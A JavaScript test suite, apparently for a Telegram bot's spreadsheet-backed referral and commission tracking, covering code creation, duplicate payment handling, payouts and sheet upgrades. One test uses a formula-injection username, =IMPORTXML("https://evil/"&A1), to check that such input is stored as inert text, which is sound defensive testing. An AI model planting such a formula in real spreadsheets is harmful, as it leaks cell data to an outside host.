const LOG_HEADERS = [...OLD_LOG_HEADERS, 'Referral ID', 'Referrer Name', 'Plan'];

/** A column of the Referrals tab, by name. */
const rc = (header) => REFERRAL_HEADERS.indexOf(header);

/** A book with both referral tabs already present. */
function referralBook(codes = [], log = []) {
  return {
    Referrals: [REFERRAL_HEADERS, ...codes],
    'Referral Log': [LOG_HEADERS, ...log]
  };
}

const codeRow = (code, id, username = '', status = 'active') =>
  [code, id, username, '', status, '01-01-2026, 10:00:00 AM IST', ''];

const logRow = (code, referrer, referred, paymentId, commission, status = 'pending') =>
  ['01-01-2026, 10:00:00 AM IST', code, referrer, '', referred, '', '', 'Group',
    paymentId, 199, 19.9, 179.1, commission, status, '', ''];

test('the referral tabs are created the first time they are needed', async () => {
  const book = {};
  fakeSheets(book);

  const made = await DIRECT.createReferral(ctx, {
    telegram_id: '111', username: 'asha', name: 'Asha K', code: 'REFAJMXPQ'
  });

  assert.equal(made.code, 'REFAJMXPQ');
  assert.equal(made.status, 'active');
  assert.deepEqual(book.Referrals[0], REFERRAL_HEADERS, 'the tab was made with its headers');
  assert.equal(book.Referrals[1][0], 'REFAJMXPQ');
  assert.equal(book.Referrals[1][1], '111');
  assert.equal(book.Referrals[1][2], 'asha');
});

test('asking twice gives the same code, never a second one', async () => {
  // Two codes for one member would split their earnings, and neither half
  // would ever reach a payout.
  const book = referralBook([codeRow('REFAJMXPQ', '111', 'asha')]);
  const log = fakeSheets(book);

  const again = await DIRECT.createReferral(ctx, {
    telegram_id: '111', username: 'asha', name: 'Asha K', code: 'REFWMXD9N'
  });

  assert.equal(again.code, 'REFAJMXPQ', 'the code they already had');
  assert.equal(book.Referrals.length, 2, 'no second row');
  assert.equal(log.appends || 0, 0);
});

test('a code that is already taken is refused, so the caller can try again', async () => {
  const book = referralBook([codeRow('REFAJMXPQ', '111')]);
  fakeSheets(book);
  await assert.rejects(
    DIRECT.createReferral(ctx, { telegram_id: '222', code: 'REFAJMXPQ' }),
    (err) => err.codeTaken === true
  );
});

test('a code is found by its own name and by its owner', async () => {
  fakeSheets(referralBook([codeRow('REFAJMXPQ', '111', 'asha'), codeRow('REFWMXD9N', '222')]));

  assert.equal((await DIRECT.getReferral(ctx, 'REFAJMXPQ')).telegram_id, '111');
  assert.equal((await DIRECT.getReferral(ctx, 'refajmxpq')).telegram_id, '111', 'case does not matter');
  assert.equal(await DIRECT.getReferral(ctx, 'REFNOPE22'), null);
  assert.equal((await DIRECT.getReferralFor(ctx, '222')).code, 'REFWMXD9N');
  assert.equal((await DIRECT.getReferralFor(ctx, 222)).code, 'REFWMXD9N', 'a number id works too');
  assert.equal(await DIRECT.getReferralFor(ctx, '999'), null);
});

test('a code can be switched off without touching what it earned', async () => {
  const book = referralBook([codeRow('REFAJMXPQ', '111')], [logRow('REFAJMXPQ', '111', '222', 'pay_1', 35.82)]);
  fakeSheets(book);

  assert.equal(await DIRECT.setReferralStatus(ctx, 'REFAJMXPQ', 'disabled'), 1);
  assert.equal(book.Referrals[1][4], 'disabled');
  assert.equal(book['Referral Log'][1][13], 'pending', 'the earning is untouched');

  assert.equal(await DIRECT.setReferralStatus(ctx, 'REFNOPE22', 'disabled'), 0);
});

test('one referred payment is one row, naming both sides', async () => {
  const book = referralBook([codeRow('REFAJMXPQ', '111', 'asha')]);
  fakeSheets(book);

  const result = await DIRECT.recordReferralEarning(ctx, {
    code: 'REFAJMXPQ',
    referrer_telegram_id: '111', referrer_username: 'asha',
    referred_telegram_id: '222', referred_username: 'ravi', referred_name: 'Ravi T',
    group: 'APPSC Telugu', payment_id: 'pay_ABC',
    original_paise: 19900, discount_paise: 1990, paid_paise: 17910, commission_paise: 3582
  });

  assert.equal(result.recorded, true);
  const row = book['Referral Log'][1];
  assert.equal(row[1], 'REFAJMXPQ');
  assert.equal(row[2], '111', 'who invited');
  assert.equal(row[4], '222', 'who joined');
  assert.equal(row[6], 'Ravi T');
  assert.equal(row[8], 'pay_ABC');
  assert.equal(row[9], 199, 'rupees in the sheet, paise in the code');
  assert.equal(row[11], 179.1);
  assert.equal(row[12], 35.82);
  assert.equal(row[13], 'pending');
});

test('the same payment is never credited twice', async () => {
  // Razorpay retries a webhook on any non-2xx, so one sale can arrive many
  // times. Without this the inviter is paid once per delivery.
  const book = referralBook([codeRow('REFAJMXPQ', '111')],
    [logRow('REFAJMXPQ', '111', '222', 'pay_ABC', 35.82)]);
  fakeSheets(book);

  const again = await DIRECT.recordReferralEarning(ctx, {
    code: 'REFAJMXPQ', referrer_telegram_id: '111', referred_telegram_id: '222',
    payment_id: 'pay_ABC', commission_paise: 3582
  });

  assert.equal(again.recorded, false);
  assert.match(again.reason, /already recorded/);
  assert.equal(book['Referral Log'].length, 2, 'no second row');
});

test('earnings read back as paise, and can be narrowed to one code', async () => {
  fakeSheets(referralBook([], [
    logRow('REFAJMXPQ', '111', '222', 'pay_1', 35.82),
    logRow('REFWMXD9N', '333', '444', 'pay_2', 40),
    logRow('REFAJMXPQ', '111', '555', 'pay_3', 35.82, 'paid')
  ]));

  const all = await DIRECT.listReferralEarnings(ctx);
  assert.equal(all.length, 3);
  assert.equal(all[0].commission_paise, 3582, 'rupees in the sheet become paise here');
  assert.equal(all[0].referred_telegram_id, '222');

  const mine = await DIRECT.listReferralEarnings(ctx, 'REFAJMXPQ');
  assert.deepEqual(mine.map((m) => m.payment_id), ['pay_1', 'pay_3']);
  assert.equal(mine[1].status, 'paid');
});

test('settling marks only that code\'s pending rows, and stamps when', async () => {
  const book = referralBook([], [
    logRow('REFAJMXPQ', '111', '222', 'pay_1', 35.82),
    logRow('REFAJMXPQ', '111', '333', 'pay_2', 35.82),
    logRow('REFWMXD9N', '444', '555', 'pay_3', 40)
  ]);
  fakeSheets(book);

  const result = await DIRECT.settleReferralEarnings(ctx, 'REFAJMXPQ', [], 'Paid by Admin');

  assert.equal(result.settled, 2);
  assert.equal(result.paise, 7164);
  assert.equal(book['Referral Log'][1][13], 'paid');
  assert.match(book['Referral Log'][1][14], /IST$/, 'when it was paid');
  assert.equal(book['Referral Log'][1][15], 'Paid by Admin');
  assert.equal(book['Referral Log'][3][13], 'pending', 'another member is not touched');
});

test('settling only the payments the admin was looking at', async () => {
  // An earning recorded between the admin looking and the admin paying must
  // still be owed afterwards, not silently closed with the rest.
  const book = referralBook([], [
    logRow('REFAJMXPQ', '111', '222', 'pay_1', 35.82),
    logRow('REFAJMXPQ', '111', '333', 'pay_NEW', 35.82)
  ]);
  fakeSheets(book);

  const result = await DIRECT.settleReferralEarnings(ctx, 'REFAJMXPQ', ['pay_1']);
  assert.equal(result.settled, 1);
  assert.equal(book['Referral Log'][1][13], 'paid');
  assert.equal(book['Referral Log'][2][13], 'pending', 'the one that arrived late is still owed');
});

test('settling twice pays nothing the second time', async () => {
  const book = referralBook([], [logRow('REFAJMXPQ', '111', '222', 'pay_1', 35.82, 'paid')]);
  fakeSheets(book);
  const result = await DIRECT.settleReferralEarnings(ctx, 'REFAJMXPQ', []);
  assert.equal(result.settled, 0);
  assert.equal(result.paise, 0);
});

test('a username that looks like a formula is stored as text', async () => {
  const book = referralBook();
  fakeSheets(book);
  await DIRECT.createReferral(ctx, {
    telegram_id: '111', username: '=IMPORTXML("https://evil/"&A1)', code: 'REFAJMXPQ'
  });
  // Written RAW, so the sheet keeps it as characters rather than running it.
  assert.equal(book.Referrals[1][2], '=IMPORTXML("https://evil/"&A1)');
});

// ---------------------------------------------------------------------------
// Referral tracking in the sheet itself
// ---------------------------------------------------------------------------
// The sheet has to answer "who did this person bring in" on its own, without
// the dashboard: every inviter's row carries who opened their link, who
// joined, and what they are owed, rebuilt from the log every time.

test('an old seven-column Referrals tab is upgraded in place, keeping every row', async () => {
  // Exactly the state the live sheets are in.
  const book = {
    Referrals: [OLD_REFERRAL_HEADERS, codeRow('REFAJMXPQ', '111', 'asha')],
    'Referral Log': [OLD_LOG_HEADERS]
  };
  fakeSheets(book);

  const all = await DIRECT.listReferrals(ctx);
  assert.deepEqual(book.Referrals[0], REFERRAL_HEADERS, 'the header row was not extended');
  assert.equal(all.length, 1, 'an existing code was lost in the upgrade');
  assert.equal(all[0].code, 'REFAJMXPQ');
  assert.equal(all[0].telegram_id, '111');
});

test('a join rewrites the inviter\'s row with who joined, and what they are owed', async () => {
  const book = referralBook([codeRow('REFAJMXPQ', '111', 'asha')]);
  fakeSheets(book);

  for (const [id, user, pay] of [['222', 'ravi', 'pay_1'], ['333', 'meena', 'pay_2']]) {
    await DIRECT.recordReferralEarning(ctx, {
      code: 'REFAJMXPQ', referrer_telegram_id: '111', referrer_username: 'asha', referrer_name: 'Asha K',
      referred_telegram_id: id, referred_username: user, referred_name: user.toUpperCase(),
      group: 'Newspaper · English', payment_id: pay, plan: 'lifetime_pass',
      original_paise: 19900, discount_paise: 1990, paid_paise: 17910, commission_paise: 3582
    });
  }

  const row = book.Referrals[1];
  assert.equal(row[rc('Joined')], 2);
  assert.equal(row[rc('Joined IDs')], '222, 333', 'the sheet does not say who joined');
  assert.equal(row[rc('Joined Usernames')], '@ravi, @meena');
  assert.equal(row[rc('Total Earned')], 71.64);
  assert.equal(row[rc('Pending')], 71.64);
  assert.equal(row[rc('Paid Out')], 0);
  assert.match(String(row[rc('Last Joined At')]), /IST$/);
});

test('every log row gets its own referral id, the inviter\'s name and the pass', async () => {
  const book = referralBook([codeRow('REFAJMXPQ', '111', 'asha')]);
  fakeSheets(book);
  for (const pay of ['pay_1', 'pay_2']) {
    await DIRECT.recordReferralEarning(ctx, {
      code: 'REFAJMXPQ', referrer_telegram_id: '111', referrer_name: 'Asha K',
      referred_telegram_id: pay, payment_id: pay, plan: 'lifetime_pass', commission_paise: 3582
    });
  }
  const log = book['Referral Log'];
  const lc = (h) => LOG_HEADERS.indexOf(h);
  assert.equal(log[1][lc('Referral ID')], 'RL-0001');
  assert.equal(log[2][lc('Referral ID')], 'RL-0002');
  assert.equal(log[1][lc('Referrer Name')], 'Asha K');
  assert.equal(log[1][lc('Plan')], 'lifetime_pass');
});

test('paying an inviter moves their money from Pending to Paid Out in the sheet', async () => {
  const book = referralBook([codeRow('REFAJMXPQ', '111', 'asha')], [
    logRow('REFAJMXPQ', '111', '222', 'pay_1', 35.82),
    logRow('REFAJMXPQ', '111', '333', 'pay_2', 35.82)
  ]);
  fakeSheets(book);

  await DIRECT.settleReferralEarnings(ctx, 'REFAJMXPQ', ['pay_1']);
  const row = book.Referrals[1];
  assert.equal(row[rc('Pending')], 35.82);
  assert.equal(row[rc('Paid Out')], 35.82);
  assert.equal(row[rc('Total Earned')], 71.64, 'paying out does not change what was earned');
});

test('a cancelled earning drops out of the counts and the ids', async () => {
  const book = referralBook([codeRow('REFAJMXPQ', '111', 'asha')], [
    logRow('REFAJMXPQ', '111', '222', 'pay_1', 35.82),
    logRow('REFAJMXPQ', '111', '333', 'pay_2', 35.82, 'cancelled')
  ]);
  fakeSheets(book);
  await DIRECT.rebuildReferralSummaries(ctx);
  assert.equal(book.Referrals[1][rc('Joined')], 1);
  assert.equal(book.Referrals[1][rc('Joined IDs')], '222');
});

test('each person who opens a link is counted once, and the owner never', async () => {
  const book = referralBook([codeRow('REFAJMXPQ', '111', 'asha')]);
  fakeSheets(book);

  assert.equal((await DIRECT.recordReferralOpen(ctx, 'REFAJMXPQ', '222')).opens, 1);
  assert.equal((await DIRECT.recordReferralOpen(ctx, 'REFAJMXPQ', '222')).recorded, false,
    'the same person tapping twice is still one open');
  assert.equal((await DIRECT.recordReferralOpen(ctx, 'REFAJMXPQ', '333')).opens, 2);
  assert.equal((await DIRECT.recordReferralOpen(ctx, 'REFAJMXPQ', '111')).recorded, false,
    'the owner opening their own link is not a visitor');
  assert.equal((await DIRECT.recordReferralOpen(ctx, 'REFNOPE22', '444')).recorded, false);

  assert.equal(book.Referrals[1][rc('Link Opens')], 2);
  assert.equal(book.Referrals[1][rc('Opened By (IDs)')], '222, 333');
});

test('rebuilding every summary repairs rows made before the summary existed', async () => {
  const book = referralBook(
    [codeRow('REFAJMXPQ', '111', 'asha'), codeRow('REFWMXD9N', '444', 'kiran')],
    [logRow('REFAJMXPQ', '111', '222', 'pay_1', 35.82),
     logRow('REFWMXD9N', '444', '555', 'pay_2', 40, 'paid')]
  );
  fakeSheets(book);

  const result = await DIRECT.rebuildReferralSummaries(ctx);
  assert.equal(result.rebuilt, 2);
  assert.equal(book.Referrals[1][rc('Joined IDs')], '222');
  assert.equal(book.Referrals[2][rc('Joined IDs')], '555');
  assert.equal(book.Referrals[2][rc('Paid Out')], 40);
  assert.equal(book.Referrals[2][rc('Pending')], 0);
});

test('a new code is created with its share link and a zeroed summary', async () => {
  const book = {};
  fakeSheets(book);
  await DIRECT.createReferral(ctx, {
    telegram_id: '111', username: 'asha', code: 'REFAJMXPQ',
    share_link: 'https://t.me/appscpaymentsbot?start=ref_REFAJMXPQ'
  });
  const row = book.Referrals[1];
  assert.equal(row[rc('Share Link')], 'https://t.me/appscpaymentsbot?start=ref_REFAJMXPQ');
  assert.equal(row[rc('Joined')], 0);
  assert.equal(row[rc('Link Opens')], 0);
});

test('a rebuild fills in blank share links and open counts, and never overwrites a link', async () => {
  const book = referralBook([
    codeRow('REFAJMXPQ', '111', 'asha'),
    [...codeRow('REFWMXD9N', '222', 'ravi'), 'https://t.me/oldbot?start=ref_REFWMXD9N', 3, '1, 2, 3']
  ]);
  fakeSheets(book);
  await DIRECT.rebuildReferralSummaries(ctx, { botUsername: '@appscpaymentsbot' });

  assert.equal(book.Referrals[1][rc('Share Link')], 'https://t.me/appscpaymentsbot?start=ref_REFAJMXPQ');
  assert.equal(book.Referrals[1][rc('Link Opens')], 0);
  assert.equal(book.Referrals[2][rc('Share Link')], 'https://t.me/oldbot?start=ref_REFWMXD9N',
    'a link the member already sent was overwritten');
  assert.equal(book.Referrals[2][rc('Link Opens')], 3);
});
